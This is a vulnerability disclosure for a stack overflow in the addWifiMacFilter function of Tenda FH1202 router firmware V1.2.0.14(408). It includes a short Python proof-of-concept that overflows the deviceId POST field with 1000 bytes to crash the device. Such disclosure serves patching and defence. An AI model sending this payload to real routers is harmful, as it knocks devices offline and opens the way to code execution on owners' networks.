## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `addWifiMacFilter` function. The `v5` variable receives the `deviceId` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v5` can trigger this security vulnerability.

![image-20240319224809289](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224809289.png)

![image-20240319224750955](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224750955.png)

![image-20240319224759788](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224759788.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addWifiMacFilter"
payload = b"a"*1000

data = {"deviceMac": 1, "deviceId":payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319224841939](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224841939.png)